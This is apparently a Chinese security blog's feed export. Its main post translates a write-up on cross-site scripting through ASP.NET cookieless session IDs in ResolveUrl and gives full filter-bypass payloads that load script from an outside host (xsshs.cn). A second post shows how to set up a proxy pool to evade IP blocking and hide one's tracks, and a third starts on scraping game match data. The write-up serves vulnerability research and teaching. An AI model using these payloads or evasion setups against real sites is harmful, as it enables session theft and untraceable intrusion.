session的浏览器接收到请求，在路径中使用波浪号（〜）可能会创建一个新session并可能导致丢失session数据</p></blockquote><p>现在，让我们回到最早的<code>ResolveUrl</code>代码段，它位于<code>A/B/C/default.aspx</code>，如图:</p><p><img src="asp_net_3.png" alt="img"></p><p>当我们打开*<code>http://localhost/(A(ABCD))/A/B/C/default.aspx</code> ，  <code>(A(ABCD))</code>也被加到Script.js路径中了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;(A(ABCD))&#x2F;Script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>把<code>A(ABCD)</code>放到不同的位置效果也一样，例如:访问<code>http://localhost/A/B/C/(A(ABCD))/default.aspx</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;(A(ABCD))&#x2F;Script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>正像我刚才说的那样，现在可以看到我们成功控制了Script.js的URI路径。</p><p>这个控制可以让我们开始XSS了!例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;A&#x2F;B&#x2F;C&#x2F;(A(%22onerror&#x3D;%22alert&#96;1&#96;%22))&#x2F;default.aspx</span><br></pre></td></tr></table></figure><p>这只是一个简单的alert，(译者注:虽然大部分情况用alert就可以证明存在xss了，但并不一定能执行任意js代码).所以真正的乐趣开始了，因为地方并不是允许所有字符的。</p><p>Fuzz一下，从0x00-0xF7，找出处哪些字符无法使用。</p><p>从0x00到0x1F直接都会导致服务器返回400，这些是不可打印的ASCII字符，因此我们忽略它们.进一步测试，其他禁止使用的字符(返回400或404)是:</p><table><thead><tr><th>%</th><th>0x25</th></tr></thead><tbody><tr><td>&amp;</td><td>0x26</td></tr><tr><td>)</td><td>0x29</td></tr><tr><td>*</td><td>0x2a</td></tr><tr><td>+</td><td>0x2b</td></tr><tr><td>/</td><td>0x2f</td></tr><tr><td>:</td><td>0x3a</td></tr><tr><td>&lt;</td><td>0x3c</td></tr><tr><td>&gt;</td><td>0x3e</td></tr><tr><td>?</td><td>0x3f</td></tr><tr><td>\</td><td>0x5c</td></tr></tbody></table><p>黑名单中有三个字符对我们特别有用:</p><ul><li>右括号–我们需要它来调用JavaScript中的函数</li><li>加号–我们经常用来连接字符串</li><li>斜线–我们不仅要运行一些JS，还需要将结果发送到某个地方，例如VPS；没有斜杠我们就无法进入VPS</li></ul><p>现在，让我们思考一下如何绕过它们。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS!"></a>XSS!</h3><p>在JavaScript的ES6中提供了一种新特性去调用模板字符串—-反引号.用反引号代替单引号或双引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var text &#x3D; &#39;Hello&#39;</span><br><span class="line">var text &#x3D; &#96;Hello&#96;</span><br></pre></td></tr></table></figure><p>反引号有一个重要特性，它可以用来执行JavaScript表达式，<code>$&#123;&#125;</code>的变量会被插入到字符串中.例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var text &#x3D; &#96;Hello from $&#123;document.domain&#125;&#96;</span><br><span class="line">console.log(text)</span><br><span class="line">&gt;&gt;&gt; Hello from blog.isec.pl</span><br></pre></td></tr></table></figure><p>这种方法可以用来代替<code>+</code>拼接字符串，例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(&#96;$&#123;&#39;a&#39;&#125;$&#123;&#39;b&#39;&#125;$&#123;&#39;c&#39;&#125;&#96;)</span><br><span class="line">&gt;&gt;&gt; abc</span><br></pre></td></tr></table></figure><p>反引号还使我们摆脱的括号.我保证大伙肯定用过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure><p>让我们用这个技巧来创建一个<code>script</code>标签:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js&#x3D;document.createElement(&#39;script&#39;)</span><br><span class="line">js&#x3D;document.createElement&#96;script&#96;</span><br></pre></td></tr></table></figure><p>创建script元素后，还需要设置src使其指向外部的XSS payload。</p><p>由于太多字符列入了黑名单，所以我们用创造了一种通用的方法动态加载我们的外部主机 XSS payload。</p><p>另外，ASP.NET的<code>cookieless session ID</code>有长度限制，得从其他地方加载JavaScript脚本来绕过。</p><p>在VPS上挂一个写了<code>alert(document.domain)</code>的脚本，假设路径为<code>http://eval/xss.js</code></p><p>当script标签创建的时候，我们需要他的<code>src</code>指向外部的XSS payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js.src&#x3D;&#39;&#x2F;&#x2F;eval&#x2F;xss.js&#39;</span><br></pre></td></tr></table></figure><p>斜杠被禁用了，可以通过<code>String.fromCharCode</code>绕过.用<code>String.fromCharCode`47` </code>绕过<code>\</code>，并且将其拼接起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js.src&#x3D;&#96;$&#123;String.fromCharCode&#96;47&#96;&#125;$&#123;String.fromCharCode&#96;47&#96;&#125;eval$&#123;String.fromCharCode&#96;47&#96;&#125;XSS.JS&#96;</span><br></pre></td></tr></table></figure><p>现在我们还需要一个地方放script标签，比如<code>head</code>就不错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">headEl&#x3D;document.getElementsByTagName&#96;head&#96;[0];</span><br></pre></td></tr></table></figure><p>然后我们需要调用<code>headEl.appendChild(js)</code> ，然而，事实却出乎意料:</p><p>让我们回到<code>alert`1` </code>的例子.尽管它可以像字符串一样工作，但是当我们传入js表达式的时候，他会产生非常意外的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;$&#123;1&#125;&#96;</span><br></pre></td></tr></table></figure><p>弹出了一个逗号，而不是预期中的1，事实证明，<code>alert(`$&#123;1&#125;`) </code>与<code>alert`$&#123;1&#125;` </code>不一样。</p><p>后一种语法叫带标签的模板字符串.<code>function`params` </code>不会将params传入到函数的参数中，它仅仅使用函数修改模板字符串的参数。</p><p>(译者注，很难用语言解释这个概念，可以看下官方文档<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function whatsGoingOn()</span><br><span class="line">&#123;</span><br><span class="line">console.log(arguments);</span><br><span class="line">&#125;</span><br><span class="line">whatsGoingOn&#96;$&#123;1&#125;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [ [&quot;&quot;， &quot;&quot;]， 1 ]</span><br></pre></td></tr></table></figure><p>结果中，数组的第一个参数是围绕js表达式的字符串，确认一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatsGoingOn&#96;LEFT$&#123;5-1&#125;RIGHT&#96;</span><br><span class="line">&gt;&gt;&gt; [ [&quot;LEFT&quot;， &quot;RIGHT&quot;]， 4 ]</span><br></pre></td></tr></table></figure><p>这对我们来说是个好消息，JavaScript提供了一个执行代码的方法.如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new Function([&quot;whatever&quot;，&quot;whatever&quot;]，&quot;alert(1)&quot;)()</span><br><span class="line">\\等效于</span><br><span class="line">var test &#x3D; &quot;alert(1)&quot;;</span><br><span class="line">new Function&#96;whatever$&#123;test&#125;whatever&#96;</span><br></pre></td></tr></table></figure><p>现在我们要做的只是调用与<code>headEl.appendChild(js)</code>等效的方法.但是我们仍然不能使用括号。</p><p>我们为什么要关心呢?让我们把<code>headEl.appendChild(js)</code>放在URI的hash中，比如<code>http://localhost/A/B/C/default.aspx#headEl.appendChild(js)</code>，然后调用<code>new Function</code>上的<code>document.location.hash</code>。</p><p>还需要摆脱<code>#</code>号，可以这样<code>document.location.hash.substr`1` </code>，最终payload!!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">js &#x3D; document.createElement&#96;script&#96;;</span><br><span class="line">js.src&#x3D;&#96;$&#123;String.fromCharCode&#96;47&#96;&#125;$&#123;String.fromCharCode&#96;47&#96;&#125;blog.isec.pl$&#123;String.fromCharCode&#96;47&#96;&#125;XSS.JS&#96;;</span><br><span class="line">headEl&#x3D;document.getElementsByTagName&#96;head&#96;[0];</span><br><span class="line">new Function&#96;X$&#123;document.location.hash.substr&#96;1&#96;&#125;X&#96;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;A&#x2F;B&#x2F;C&#x2F;(A(%22onerror&#x3D;%22js&#x3D;document.createElement&#96;script&#96;;js.src&#x3D;&#96;$&#123;String.fromCharCode&#96;47&#96;&#125;$&#123;String.fromCharCode&#96;47&#96;&#125;eval$&#123;String.fromCharCode&#96;47&#96;&#125;XSS.JS&#96;;headEl&#x3D;document.getElementsByTagName&#96;head&#96;[0];new%20Function&#96;X$&#123;document.location.hash.substr&#96;1&#96;&#125;X&#96;%22))&#x2F;default.aspx#headEl.appendChild(js)</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>已在所有主流浏览器(Firefox，Chrome，Edge)上测试这个漏洞。</p><table><thead><tr><th>ASP.NET version</th><th>&lt;%=Environment.Version%&gt; == 4.0.30319.42000</th></tr></thead><tbody><tr><td>Firefox</td><td>69.0.1 (64-bit) (the newest version)</td></tr><tr><td>Microsoft Edge</td><td>44.17763.1.0 (the newest version)</td></tr><tr><td>Chrome</td><td>77.0.3865.90 (Official Build) (64-bit) [XSS Auditor needs to be disabled]</td></tr></tbody></table><p>(译者注，似乎是个通杀全版本ASP.NET version的洞，复现在文章最后)</p><h3 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h3><p><code>scirpt</code>标签并非唯一会使用<code>ResolveUrl</code>的HTML标签，<code>link</code>，<code>a</code>，<code>img</code>等其他标签同样会使用.下面的代码包含了能导致XSS的HTML标签(对于<code>a href</code>，请使用<code>onmouseover</code>或<code>onclick</code>代替<code>onerror</code>，否则无法使用)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.js&quot;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.css&quot;) %&gt;&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.jpg&quot;) %&gt;&quot; &#x2F;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.aspx&quot;) %&gt;&quot;&gt;click&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>幸运的是，<code>ResolveUrl</code>并非唯一的能将<code>~</code>解析为webapp根目录的方法.让我们快速浏览一下其他ASP.NET功能在处理URL中的cookieless session ID时的行为。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- run src attribute on the server side as an HTML Control --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;~&#x2F;file.jpg&quot; runat&#x3D;&quot;server&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- run as Web Control --&gt;</span><br><span class="line">&lt;asp:Image ID&#x3D;&quot;Image1&quot; runat&#x3D;&quot;server&quot; ImageUrl&#x3D;&quot;~&#x2F;file.jpg&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- run as ResolveUrl --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;file.jpg&quot;) %&gt;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>然后访问最简易的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;A&#x2F;B&#x2F;C&#x2F;(A(%22onerror&#x3D;%22alert&#96;1&#96;%22))&#x2F;default.aspx</span><br></pre></td></tr></table></figure><p>得到以下结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- run src attribute on the server side as an HTML Control --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;file.jpg&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- run as Web Control --&gt;</span><br><span class="line">&lt;img id&#x3D;&quot;Image1&quot; src&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;file.jpg&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- run as ResolveUrl --&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&#x2F;(A(&quot;onerror&#x3D;&quot;alert&#96;1&#96;&quot;))&#x2F;file.jpg&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>web control 和HTML control在解析<code>~</code>时，省略了URL的cookieless部分.不幸的是，我们无法在这些地方进行XSS攻击。</p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>我们学习了关于远古ASP.NET的功能(cookieless session)的一些知识，为了向后兼容，该功能在现代Web应用程序中仍然存在.此外，我们发现了利用XSS漏的方法，了解了一些JS小技巧，用来在绕过部分字符被过滤的情况</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>翻译完了，应该并不难懂。</p><p>但是为了帮助理解，也帮助像我这样从来没接触过.NET开发的菜鸡复现.我再手把手复现展示一下。</p><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>系统，windows 10 最新版本</p><p>官网<a href="https://visualstudio.microsoft.com/zh-hans/vs/">下载</a>vs2019 community，安装的时候记得勾选C#和.NET相关的组件。</p><p>安装完新建项目，记得选<code>ASP.NET web应用程序(.NET Framework)</code>，不要选<code>ASP.NET Core WEB应用程序</code>，ASP.NET Core已经弃用了aspx，似乎也弃用了ResolveUrl方法。</p><p><img src="image-20200323020903891.png" alt="image-20200323020903891"></p><p> 下一步，然后可以选择.NET Framework的版本.原文演示的是4.0，但是实际上最新的4.8上同样可用.我们来整个最新的。</p><p><img src="image-20200323021054821.png" alt="image-20200323021054821"></p><p>再下一步，选空项目就可以。</p><p>创建完了，添加一个Web窗体。</p><p><img src="image-20200323021546570.png" alt="image-20200323021546570"></p><p>把文章开始的代码复制进去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;Script.js&quot;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    .NET version: &lt;%&#x3D;Environment.Version%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>然后运行.尝试访问，端口是随机的。</p><p>先来看看是不是像他说得这样，访问<code>https://localhost:44345/(A(ABCD))/xss.aspx</code></p><p><img src="image-20200323022126909.png" alt="image-20200323022126909"></p><p>确实可以，然后是最简单的弹窗.访问<code>https://localhost:44345/(A(%22onerror=%22alert%601%60%22))/xss.aspx</code></p><p><img src="image-20200323022227594.png" alt="image-20200323022227594"></p><p>最后是完成的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;localhost:44345&#x2F;(A(%22onerror&#x3D;%22js&#x3D;document.createElement%60script%60;js.src&#x3D;%60$%7BString.fromCharCode%6047%60%7D$%7BString.fromCharCode%6047%60%7Dxsshs.cn$%7BString.fromCharCode%6047%60%7DQbLA%60;headEl&#x3D;document.getElementsByTagName%60head%60[0];new%20Function%60X$%7Bdocument.location.hash.substr%601%60%7DX%60%22))&#x2F;xss.aspx#headEl.appendChild(js)</span><br></pre></td></tr></table></figure><p><img src="image-20200323024002741.png" alt="image-20200323024002741"></p><p>OK，大功告成。</p><p>备注:之前看到linux下也可以通过mono运行aspx程序，测试了下，并没有这个漏洞。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;*(本文首发于先知社区,链接:&lt;a href=&quot;https://xz.aliyun.com/t/7453&quot;&gt;https://xz.aliyun.com/t/7453&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;原文链接: &lt;a href=&quot;https://blog.isec.pl/all-is-xss-that-comes-to-the-net/&quot;&gt;All is XSS that comes to the .NET&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原作者: Paweł Hałdrzyński&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://portswigger.net/research/top-10-web-hacking-techniques-of-2019&quot;&gt;portswigger发布的2019年十大web攻击技术&lt;/a&gt;中发现了这篇文章，仔细研究了一番，觉得挺有意思，故尝试翻译。&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞分析" scheme="https://m09ic.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="XSS" scheme="https://m09ic.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>小技巧---给工具用上代理池</title>
    <link href="https://m09ic.top/posts/22311/"/>
    <id>https://m09ic.top/posts/22311/</id>
    <published>2020-03-19T19:16:20.000Z</published>
    <updated>2021-01-04T14:51:33.780Z</updated>
    
    <content type="html"><![CDATA[<p><em>(本文首发于T00ls论坛,链接:<a href="https://www.t00ls.net/articles-55479.html">https://www.t00ls.net/articles-55479.html</a> , 这么简单的小技巧竟然有13000阅读了,惊了!!)</em></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>代理池是渗透测试中常用的工具,用来躲避各种各样的封IP的防火墙,也帮助自身隐藏踪迹.</p><p>大部分工具也支持代理选项,但少有支持代理池的.实际上,不需要修改工具去支持代理池,只需要弄一个中间层,在中间层搭建代理池,然后支持代理的工具就可以变相支持代理池了.</p><p>当然,解决方案多种多样,我只提一个最简单的.</p><a id="more"></a><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>shadowsocksR应该都用过吧?没有用过的可以去这里下载<a href="https://github.com/shadowsocksr-backup/shadowsocksr-csharp/releases">https://github.com/shadowsocksr-backup/shadowsocksr-csharp/releases</a></p><p>ssr是一个很强大的工具,最常用来绕过网络审查,也就是”翻墙”.但ssr的选项不知道各位有没有看过,实际上还可以用来搭建代理池.</p><p>当然ssr首先需要添加服务器,这里我就不打广告了,可以自行搭建,自行搭建代理池的成本还是比较高的.所以建议购买现成的机场,大概四五十块可以买四五十个ip的服务一个季度.当然也有免费的订阅服务,但是免费的服务质量就不敢说了.</p><p>下面上手使用</p><p><img src="1.png" alt="image-20200320010654834"></p><p>需要用到这两个功能.</p><p>第一个是开启本地代理,允许来自局域网的连接.</p><p>第二个是打开负载均衡,并将模式选择 随机.</p><p>这样一个搭建在本地的代理池就完事了.</p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>burpsuite这么强大的工具肯定支持代理,所以直接填上就好了</p><p><img src="2.png" alt="image-20200320011228418"></p><p>如果是日国外的站,记得勾上<code>Do DNS lookups over SOCKS proxy</code></p><p>工具使用只讲这一个,所有支持代理的工具都可以用这种方式完成代理池</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>以requests为例.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:1080&#x27;</span>,<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:1080&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">&quot;https://baidu.com&quot;</span>,proxies=proxies)</span><br></pre></td></tr></table></figure><p>python这里有些莫名其妙,代理协议填socks5不行,填http就可以了.</p><p>python的requests还有一个小坑,302重定向的请求不会通过代理,因此需要关闭自动重定向,加上代理后手动请求.</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>如果有些工具不支持代理池,可以把它放到虚拟机里,然后在虚拟机中配置全局的代理.</p><p>以kali为例</p><p><img src="3.png" alt="image-20200320020009356"></p><p>ip地址是ssr所在的内网地址</p><h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><p>有一些工具并不支持代理功能,因此可以通过proxifier实现代理池.</p><p>配置也很简单.</p><p><img src="4.png" alt="image-20200320022818815"></p><p>OK即可.然后就可以看到应用的流量走ssr过了.</p><h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><p>windows下有proxifier,linux下也有类似的工具,叫proxychains.</p><p>proxychains是kali自带的工具,其他系统按照官方文档安装下即可.</p><p>使用:</p><p><code>vim /etc/proxychains.conf</code></p><p>将<code>socks4 127.0.0.1 9095</code>修改成</p><p><code>socks5 ssr所在ip 1080</code></p><p><code>proxychains wget https://google.com</code></p><h3 id="SStap"><a href="#SStap" class="headerlink" title="SStap"></a>SStap</h3><p>sstap通过虚拟网卡实现网络层代理,应该是比上面这些都更好的选择.</p><p>但是我测试sstap的时候失败了.</p><p>sstap能连上ssr的所在的1080端口,也接收到了流量,但是访问时报错了.</p><p>如果能解决,请联系我,感谢.</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>上面的使用场景能覆盖大多数需求,但是因为socks协议本身的限制,是会话层的协议,位于表示层与传输层之间.</p><p>因此只能代理TCP和UDP的数据.如ICPM协议的ping就无能为力了.不能像VPN一样立足于数据链路层或者网络层.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;(本文首发于T00ls论坛,链接:&lt;a href=&quot;https://www.t00ls.net/articles-55479.html&quot;&gt;https://www.t00ls.net/articles-55479.html&lt;/a&gt; , 这么简单的小技巧竟然有13000阅读了,惊了!!)&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;代理池是渗透测试中常用的工具,用来躲避各种各样的封IP的防火墙,也帮助自身隐藏踪迹.&lt;/p&gt;
&lt;p&gt;大部分工具也支持代理选项,但少有支持代理池的.实际上,不需要修改工具去支持代理池,只需要弄一个中间层,在中间层搭建代理池,然后支持代理的工具就可以变相支持代理池了.&lt;/p&gt;
&lt;p&gt;当然,解决方案多种多样,我只提一个最简单的.&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://m09ic.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="工具" scheme="https://m09ic.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>如何在LOL中正确的抓出内鬼</title>
    <link href="https://m09ic.top/posts/29936/"/>
    <id>https://m09ic.top/posts/29936/</id>
    <published>2020-03-19T14:45:39.000Z</published>
    <updated>2021-01-04T14:51:24.923Z</updated>
    
    <content type="html"><![CDATA[<p><em>(本文首发于星盟安全团队微信公众号,链接:<a href="https://mp.weixin.qq.com/s/85gX5ci1ih9Mb9tPIx45tg">https://mp.weixin.qq.com/s/85gX5ci1ih9Mb9tPIx45tg</a>  ,并由团队发表至secpulse,链接:<a href="https://www.secpulse.com/archives/126641.html">https://www.secpulse.com/archives/126641.html</a>)</em></p><p>update:2020.4.2:文章竟然被云舒大神转发了.开心!!</p><a id="more"></a><p><img src="41b0334db98c4299.jpg" alt="1a"></p><p>原本假期计划是打两个星期游戏再随便折腾点好玩的.但可惜,假期余额不断充值到账,游戏也给我打腻了.于是顺着游戏里小伙伴的撕逼开始了抓内鬼之旅,让👴来看看到底是谁让我上不了王者:D.</p><h2 id="爬数据"><a href="#爬数据" class="headerlink" title="爬数据"></a>爬数据</h2><p>最初打算是使用wegame的查询召唤师接口,但是没找到web端且只记录半年的数据,不方便抓包(懒得用wireshark分析).</p><p>然后去翻翻有没有现成的轮子,看到掌盟上已经有人做过类似的工作,还真有.</p><p><a href="https://zhuanlan.zhihu.com/p/71549580">https://zhuanlan.zhihu.com/p/71549580</a></p><p>爬掌盟脚本都是现成的,但是掌盟只记录了350场,还被无限火力,大乱斗场次给污染了.代码写到一半放弃了.</p><p>继续翻着翻着,然后在某个论坛找到了英雄联盟官网有详细的对战数据,而且不记录大乱斗,无限火力等娱乐模式,只记录匹配,排位与人机.我看了下自己的账号最早的场次记录时间在2018年4月.有一点缺陷是只能看自己的所在的游戏,不能查询其他玩家,那就只能登陆自己和小伙伴的号一个一个来.</p><p>QQ的模拟登陆不好做,好在账号就四五个,登录手动复制Cookie更加方便.</p><p>入口找到了.动手抓包.</p><p>发现它是先请求一次获得全部的比赛记录,再根据需求动态加载具体数据.这里<code>accountId</code>每个账号不同,全局搜索一下流量就能看到了.每个账号只能获取自己账号的数据,填别人的账号无效.</p><p><code>http://lol.sw.game.qq.com/lol/api/?c=Battle&amp;a=matchList&amp;areaId=1&amp;accountId=2944742458&amp;queueId=70,72,73,75,76,78,96,98,100,300,310,313,317,318,325,400,420,430,450,460,600,610,940,950,960,980,990,420,440,470,83,800,810,820,830,840,850&amp;r1=matchList</code></p><p><img src="image-20200210163557075.png" alt="1"></p><p>这个号一共上千场比赛记录.需要获取其中的gameId参数,拼接到查询具体场次的api中.</p><p><code>http://lol.sw.game.qq.com/lol/api/?c=Battle&amp;a=combatGains&amp;areaId=1&amp;gameId=4683390105&amp;r1=combatGains</code></p><p><img src="image-20200210163820171.png" alt="image-20200210163820171"></p><p>格式化可以清晰的看到各种数据:</p><p><img src="image-20200210165240045.png" alt="a"></p><p>很简单,写个脚本把所有数据都爬了.爬虫脚本我写了两份,一份是requests的,还一份是scrapy的,都在github中,链接在文末.</p><p>requests的单线程版本大概10分钟能爬完数据.如果用scrapy,则是20秒左右.</p><h2 id="入库"><a href="#入库" class="headerlink" 